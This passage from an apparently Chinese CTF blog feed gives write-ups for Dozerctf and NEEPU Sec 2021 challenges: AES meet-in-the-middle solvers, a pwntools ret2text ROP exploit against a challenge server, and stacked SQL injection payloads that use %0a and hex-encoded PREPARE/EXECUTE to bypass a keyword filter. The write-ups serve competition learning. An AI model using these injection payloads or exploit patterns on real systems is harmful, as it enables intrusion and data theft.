t</span>):</span></span><br><span class="line"><span class="keyword">return</span> strxor(<span class="built_in">bytes</span>.fromhex(s),<span class="built_in">bytes</span>.fromhex(t)).<span class="built_in">hex</span>().rjust(<span class="number">32</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> key2 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> key3 <span class="keyword">in</span> dic:</span><br><span class="line">key = <span class="string">&#x27;2&#123;&#125;9cf037f8b3a&#123;&#125;2b19b5bda978c294&#123;&#125;5&#x27;</span>.<span class="built_in">format</span>(key1,key2,key3)</span><br><span class="line">p1 = <span class="string">b&#x27;I do not care th&#x27;</span>.<span class="built_in">hex</span>()</span><br><span class="line">p2 = <span class="string">b&#x27;e result&#x27;</span>.<span class="built_in">hex</span>() + key[:<span class="number">8</span>].encode().<span class="built_in">hex</span>()</span><br><span class="line">p3 = key[<span class="number">8</span>:<span class="number">24</span>].encode().<span class="built_in">hex</span>()</span><br><span class="line">p4 = key[<span class="number">24</span>:].encode().<span class="built_in">hex</span>() + <span class="string">&#x27;08&#x27;</span>*<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> e41 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> e42 <span class="keyword">in</span> dic:</span><br><span class="line">e4 = <span class="string">&#x27;e16a7b3b190&#123;&#125;e487abfa9&#123;&#125;cf379d1a3c&#x27;</span>.<span class="built_in">format</span>(e41,e42)</span><br><span class="line">c4 = xor_hex(e4, p3)</span><br><span class="line">c3 = xor_hex(p4, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c4)).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment">#e3 = 8c582c6704f$$$$153bd3313b84235ac</span></span><br><span class="line">e3 = xor_hex(c3, p2)</span><br><span class="line"><span class="keyword">if</span> e3.startswith(<span class="string">&#x27;8c582c6704f&#x27;</span>) <span class="keyword">and</span> e3.endswith(<span class="string">&#x27;153bd3313b84235ac&#x27;</span>):</span><br><span class="line">c2 = xor_hex(p3, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c3)).<span class="built_in">hex</span>())</span><br><span class="line">e2 = xor_hex(c2, p1)</span><br><span class="line"><span class="comment">#e2 = 6a20c55719151$$fccecb4$$$$$2a27c</span></span><br><span class="line"><span class="keyword">if</span> e2.startswith(<span class="string">&#x27;6a20c55719151&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;fccecb4&#x27;</span> <span class="keyword">in</span> e2 <span class="keyword">and</span> e2.endswith(<span class="string">&#x27;2a27c&#x27;</span>):</span><br><span class="line">c1 = xor_hex(p2, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c2)).<span class="built_in">hex</span>())</span><br><span class="line">e1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">f1 = xor_hex(e1, c1)</span><br><span class="line">f2 = xor_hex(p1, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c1)).<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(f1)+<span class="built_in">bytes</span>.fromhex(f2))</span><br><span class="line">                            </span><br><span class="line"><span class="comment">#hei_my_bro_this_is_flag_you_know</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="strange-encrypt"><a href="#strange-encrypt" class="headerlink" title="strange encrypt"></a>strange encrypt</h3><blockquote><p>学长学姐说这题应该不难吧？</p></blockquote><p>已知 <code>fl4g</code> 和640次AES加密后的 <code>fl4g_enc</code>，640个生成的<code>key</code> 按 <code>extend_secret</code> 二进制位选择前半段或后半段作为每轮AES使用的 <code>key</code>。</p><p>已知10位 <code>secret</code> 的前两位，对应扩展 <code>extend_secret</code> 为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">extend_secret:</span><br><span class="line">s1=[?,?,?,?,7]</span><br><span class="line">s2=[8,?,?,?,?]</span><br><span class="line">p1=(xxxx xxxx xxxx xxxx 0111)*16</span><br><span class="line">p2=(1000 xxxx xxxx xxxx xxxx)*16</span><br><span class="line">ex=p1+p2</span><br></pre></td></tr></table></figure><p>采用中间人攻击(MITM)，枚举 <code>s1</code> 中未知4位得到<code>fl4g</code> AES加密32次的可能值（16^4=65536），再枚举 <code>s2</code> 中未知4位得到 <code>fl4g_enc</code> AES解密32次的可能值（16^4=65536），两组可能值中相等的即为所求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">init_key = <span class="string">b&#x27;look_at_here!you_may_need_it!!&#x27;</span></span><br><span class="line">fl4g = <span class="string">b&#x27;fl4g&#123;I_HaTe_The_DaMn_FaKe_FlAg&#125;&#x27;</span></span><br><span class="line">fl4g_enc = <span class="string">&#x27;4b559c0adaf6c14584aea729ed3c544cee8e3ea8cf1d2dc67d620e59c1053976&#x27;</span></span><br><span class="line">flag_enc = <span class="string">&#x27;ed0a40ac74c25e549a92fb90eb07b86ba3de0001a014c2e31c5e0dc6ad8a1fd8cdad1ea856f6b47b4e960bdeb6a447fb&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s + (<span class="number">16</span> - (<span class="built_in">len</span>(s) % <span class="number">16</span>)) * <span class="string">b&#x27;\x11&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genKeys</span>(<span class="params">init</span>):</span></span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>):</span><br><span class="line">        key = hashlib.md5(init).hexdigest()</span><br><span class="line">        keys.append(key)</span><br><span class="line">        init = key.encode()</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extend</span>(<span class="params">s</span>):</span></span><br><span class="line">    s1 = [ <span class="built_in">int</span>(s[<span class="number">2</span> * i], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">2</span>)]</span><br><span class="line">    s2 = [ <span class="built_in">int</span>(s[<span class="number">2</span> * i + <span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">    part1 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s1)) * <span class="number">16</span></span><br><span class="line">    part2 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s2)) * <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> part1 + part2</span><br><span class="line"></span><br><span class="line">keys = genKeys(init_key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i,k <span class="keyword">in</span> <span class="built_in">enumerate</span>(keys):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = k[ b * <span class="number">16</span> : (b + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.encrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][b*<span class="number">16</span>:(b+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.decrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_enc</span>(<span class="params">msg, ex</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][ b * <span class="number">16</span> : (b + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.encrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_dec</span>(<span class="params">msg, ex</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>-<span class="number">1</span>, <span class="number">320</span>-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i-<span class="number">320</span>]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][b*<span class="number">16</span>:(b+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.decrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line">    </span><br><span class="line">mid = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> s11 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s12 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s13 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s14 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">s1 = [<span class="number">7</span>, s11, s12, s13, s14]</span><br><span class="line">part1 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s1)) * <span class="number">16</span></span><br><span class="line">m = half_enc(pad(fl4g), part1).<span class="built_in">hex</span>()</span><br><span class="line">mid.update(&#123;m: s1&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(mid))</span><br><span class="line"><span class="keyword">for</span> s22 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s23 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s24 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s25 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">s2 = [s22, s23, s24, s25, <span class="number">8</span>]</span><br><span class="line">part2 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s2)) * <span class="number">16</span></span><br><span class="line">m = half_dec(<span class="built_in">bytes</span>.fromhex(fl4g_enc), part2).<span class="built_in">hex</span>()</span><br><span class="line"><span class="keyword">if</span> m <span class="keyword">in</span> mid:</span><br><span class="line">s1 = mid[m]</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line">                    </span><br><span class="line"><span class="comment">#s1 = [7, 15, 9, 11, 15]</span></span><br><span class="line"><span class="comment">#s2 = [8, 4, 13, 15, 8]</span></span><br><span class="line"><span class="comment">#secret = 78ff9db4f8</span></span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;78ff9db4f8&#x27;</span></span><br><span class="line">ex = extend(secret)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt(pad(fl4g)).<span class="built_in">hex</span>() == fl4g_enc)</span><br><span class="line"><span class="built_in">print</span>(decrypt(<span class="built_in">bytes</span>.fromhex(fl4g_enc)) == pad(fl4g))</span><br><span class="line"><span class="built_in">print</span>(decrypt(<span class="built_in">bytes</span>.fromhex(flag_enc)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dozerctf&#123;thanks_to_Seniors_and_Sisters&#125;\x11\x11\x11\x11\x11\x11\x11\x11\x11&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="i-wanna-大晚上特供版"><a href="#i-wanna-大晚上特供版" class="headerlink" title="i wanna 大晚上特供版"></a>i wanna 大晚上特供版</h3><blockquote><p>晚上域渗透环境还是老是崩，没事儿来个i wanna 泄泄火，玩就是了 链接：<a href="https://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ">https://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ</a> 提取码：4s8s</p></blockquote><p>GameMaker开发的著名I Wanna系列小游戏。</p><p>用 <a href="https://github.com/OpenGMK/GM8Decompiler">GM8Decompiler</a> 把exe恢复为gmk文件，再用 <a href="https://github.com/Medo42/Gmk-Splitter">Gmk-Splitter</a> 提取gmk文件中游戏素材，在图片堆里找到包含flag的一张图片。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><blockquote><p>貌似又是原题，锤爆这个出题人 nc 1.14.160.21 20001</p></blockquote><p>简单ret2text64。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;1.14.160.21&#x27;</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401176</span></span><br><span class="line">binsh1 = <span class="number">0x401199</span></span><br><span class="line">binsh2 = <span class="number">0x4011f9</span></span><br><span class="line">p_rdi = <span class="number">0x401313</span></span><br><span class="line">p_rsi_r15 = <span class="number">0x401311</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span> + p64(p_rdi) + p64(<span class="number">0xB16BAD</span>) + p64(binsh1) + p64(p_rsi_r15) + p64(<span class="number">0xFEE1DEAD</span>) + p64(<span class="number">0</span>) + p64(p_rdi) + p64(<span class="number">0xBADF00D</span>)  + p64(binsh2) + p64(backdoor)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;比赛时间：2021年5月29日 9:00-2021年5月30日晚21:30&lt;br&gt;比赛平台：&lt;a href=&quot;http://1.14.160.21:8000/&quot;&gt;http://1.14.160.21:8000/&lt;/a&gt;&lt;/</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NEEPU Sec 2021公开赛</title>
    <link href="https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2021-05-24T11:40:39.000Z</published>
    <updated>2021-05-24T17:48:45.003Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>东北电力大学校赛，Web综合程度高，Crypto太少了。</p><p>Rank: 3</p><hr><h2 id="Noob"><a href="#Noob" class="headerlink" title="Noob"></a>Noob</h2><h3 id="Linux入门"><a href="#Linux入门" class="headerlink" title="Linux入门"></a>Linux入门</h3><blockquote><p>Linux基本指令</p><p>ls/dir: 访问当前目录</p><p>cat: 获取当前文件内容</p><p>grep: 匹配字符串</p><p>*: 匹配一个或多个字符</p><p>?: 匹配一个字符</p><p>/: 根目录</p><p>hint: Linux的系统配置文件主要放在哪里?</p></blockquote><p>Linux命令大考察。</p><p><code>ls -al</code> 当前目录发现 <code>hint.txt</code></p><p><code>cat hint.txt</code> 查看内容：<code>尝试访问根目录</code></p><p><code>ls -al /</code> 根目录发现<code>flag</code>文件</p><p><code>cat /flag</code> 查看内容：<code>可以尝试grep</code></p><p>在根目录逐个文件夹用<code>grep</code>命令试，在<code>/etc</code>下发现关键字：</p><p><code>grep -r -n &quot;Neepu&#123;&quot; /etc</code></p><p>结果：</p><p><code>/etc/neepu.conf:1:Neepu&#123;f782fecc-2e63-4819-8dd4-f2b2584c85b0&#125;</code></p><p>​    </p><h3 id="最强大脑"><a href="#最强大脑" class="headerlink" title="最强大脑"></a>最强大脑</h3><blockquote><p>不会吧，不会吧，不会有人不喜欢算算术吧…</p></blockquote><p>10s限时算数题，利用python里的requests包处理就好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://neepusec.club:18495/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">r = s.get(url)</span><br><span class="line">html = r.text</span><br><span class="line">start = html.index(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="built_in">len</span>(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="number">8</span></span><br><span class="line">end = start+html[start:].index(<span class="string">&#x27;&amp;nbsp=&amp;nbsp?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">cal = html[start:end].replace(<span class="string">&#x27;&amp;nbsp&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">r = s.post(url,data=&#123;<span class="string">&#x27;answer&#x27;</span>:<span class="built_in">str</span>(<span class="built_in">eval</span>(cal))&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>((i+<span class="number">1</span>,<span class="string">&#x27;success&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Neepu&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(i+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">html = r.text</span><br><span class="line">start = html.index(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="built_in">len</span>(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="number">8</span></span><br><span class="line">end = start+html[start:].index(<span class="string">&#x27;&amp;nbsp=&amp;nbsp?&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="随便注2-0"><a href="#随便注2-0" class="headerlink" title="随便注2.0"></a>随便注2.0</h3><blockquote><p>如果我告诉你网上有原题，你能做的出来吗?</p><p>百度/谷歌搜索: [强网杯 2019]随便注</p></blockquote><p>强网杯2019 随便注原题魔改，堆叠注入，照着来。</p><p><code>1&#39; union select 1,2,database()#</code> 得到过滤规则 <code>return preg_match(&quot;/select|update|delete|drop|insert|where|rename|set|handler|char|\*| |    |\./i&quot;,$inject);</code></p><p>空格用<code>%0a</code>代替，尝试堆叠注入：</p><p><code>0&#39;;show%0adatabases;#</code> 得到数据库名：ctftraining, information_schema, mysql, performance_schema, supersqli, test</p><p><code>0&#39;;show%0atables;#</code> 得到表名：@Neepu2021招新赛, words</p><p><code>0&#39;;desc%0a`@Neepu2021招新赛`;#</code> 得到列名：flag, NO</p><p>原题有<strong>重命名法</strong>和<strong>预处理法</strong>可得flag，这里<code>rename</code>和<code>set</code>被禁，可用<strong><code>prepare</code> 预处理+<code>execute</code> 执行</strong>的方法，构造<code>select flag from `@Neepu2021招新赛` </code>16进制字符串，代入预处理语句拿flag：</p><p><code>1&#39;;prepare%0axxx%0afrom%0a0x73656c65637420666c61672066726f6d2060404e6565707532303231e68b9be696b0e8b59b60;execute%0axxx;#</code></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h3><blockquote><p>这真的是远程桌面吗?或许吧…</p></blockquote><p>翻一圈源码，在<code>notfound.html</code>找到flag。</p><p>​    </p><h3 id="LOVE-DEATH-amp-ROBOTS"><a href="#LOVE-DEATH-amp-ROBOTS" class="headerlink" title="LOVE_DEATH&amp;ROBOTS"></a>LOVE_DEATH&amp;ROBOTS</h3><blockquote><p>Beauty and danger coexist, and the magnificence, weirdness, and extraordinary view of the world often lie in peril, and human beings are rare, so people who do not have aspirations cannot come.</p></blockquote><p>根据标题ROBOTS，容易想到<code>robots.txt</code>，访问发现<code>/n33pvfl4g.php</code>，再访问<code>n33pvfl4g.php</code>得flag。</p><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="15-Puzzle"><a href="#15-Puzzle" class="headerlink" title="15 Puzzle!"></a>15 Puzzle!</h3><blockquote><p>You can do it!</p></blockquote><p>手拼就是了，拼完有flag。</p><p>​    </p><h3 id="龙会说话？"><a href="#龙会说话？" class="headerlink" title="龙会说话？"></a>龙会说话？</h3><blockquote><p>龙会聊天吗？</p></blockquote><p>第一层，一个文件 dragon 和一个加密压缩包 dragon’s talk.rar。</p><p>010editor查看 dragon，发现尾部<code>49454E44AE426082</code>是png文件尾，查找文件头<code>89504E47</code>，分离出png图片：</p><p><img src="/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/image-20210524204117861.png" alt="image-20210524204117861"></p><p>找到<a href="https://www.dcode.fr/draconic-dragon-language">龙语解码工具</a>，解出<code>youseethedragon</code>为rar密码。</p><p>第二层，一个 dragon’s talk.wav 文件。</p><p>用audacity未发现什么信息，尝试LSB隐写，用<a href="https://silenteye.v1kings.io/">Silenteye</a>无密码得到隐藏文件flag.txt。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>Just RSA!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span> (<span class="params">p1,p2,e</span>):</span></span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;Neepu&#123;********************&#125;&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = nextprime(random.randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = encode(p, q, e)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, <span class="number">7</span>, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+e, <span class="number">7</span>, n)</span><br><span class="line"><span 